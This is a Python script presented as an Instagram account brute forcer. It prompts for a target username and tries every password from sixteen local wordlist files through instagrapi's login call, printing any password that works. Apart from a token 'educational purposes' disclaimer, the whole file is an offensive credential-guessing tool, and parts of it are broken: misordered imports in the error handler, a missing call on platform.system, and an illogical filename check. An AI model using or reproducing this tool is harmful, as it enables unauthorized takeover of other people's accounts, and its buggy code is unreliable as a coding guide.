"""
Author: @new92
Brute Forcer: Program for Brute Forcing Instagram Accounts
Please do not use it for illegal purposes !
The author is not responsible for any illegal activity/activities carried out using this program !!
The author's not responsible for any damages may be caused in the given account(s).
"""
#Imports
try:
    import sniffer
    import socket
    import http
    import websockets
    import webbrowser
    import requests
    import tkinter
    import time
    import instapy
    import nmap
    import json
    import sys
    import os
    import instaloader
    import instagrapi
    import instabot
    import urllib
    import urllib3
    import platform
    import re
    import scrapy
    from os import system
    from tkinter import messagebox
except ImportError as imp:
    print("[!] WARNING: Not all modules used in this program have been installed !")
    time.sleep(2)
    print("[+] Ignoring Warning...")
    time.sleep(1)
    if platform.system == "Windows":
        system("pip3 install -r requirements.txt")
    else:
        system("sudo pip3 install -r requirements.txt")

#Use
tkinter.messagebox.showinfo("Use !","This program has been created only for educational purposes! If this program is used for malicious purposes the author has no responsibility !")


#Logo
print("""
          d8888                   888      d8b
         d88888                   888      Y8P
        d88P888                   888
       d88P 888 88888b.  888  888 88888b.  888 .d8888b
      d88P  888 888 "88b 888  888 888 "88b 888 88K
     d88P   888 888  888 888  888 888  888 888 "Y8888b.
    d8888888888 888  888 Y88b 888 888 d88P 888      X88
   d88P     888 888  888  "Y88888 88888P"  888  88888P'
""")

#Main Program

print("[+] Github: @new92")
print("\n")
print("[01] Brute Force Account")
print("[02] Exit")
print("\n")
option=input("[::] Please choose an option: ")

while option != "01" and option != "02" and option != "1" and option != "2" or option == None:
    time.sleep(1)
    print("[!] Invalid option !")
    time.sleep(1)
    option=input("[::] Please enter again: ")
if option == "01" or option == "1":
    def BruteForce():
        time.sleep(1)
        username=input("[::] Please enter the username: ")
        while username == None or len(username) > 30 :
            print("[!] Invalid Username !")
            time.sleep(1)
            username=input("[::] Please enter again the username: ")
        username = username.lower()
        username = username.strip()
        client=instagrapi.Client()
        Found = False
        for i in range(16):
            f = open("passwords"+str(i)+".txt","r",encoding="utf8")
            f.seek(0)
            lines=f.readlines()
            for line in lines:
                content=line[0:-1]
                content=content.strip()
                password = content
                try:
                    login = client.login(username,password)
                except Exception as e:
                    continue
                if login == True:
                    Found = True
                    print("[!] Password Found: "+str(Found))
                    time.sleep(1)
                    print("[+] Password: "+str(password))
                    exit(0)
                else:
                    continue
            if password not in "passwords"+str(i)+".txt":
                f.close()
                print("[!] Password Found in File "+str(i)+": "+str(Found))
                time.sleep(2)
                print("[+] Continuing Brute Force with File "+str(i)+"...")
                time.sleep(2)
                continue
            else:
                continue
    BruteForce()
else:
    print("Exiting...")
    exit(0)
#End of the program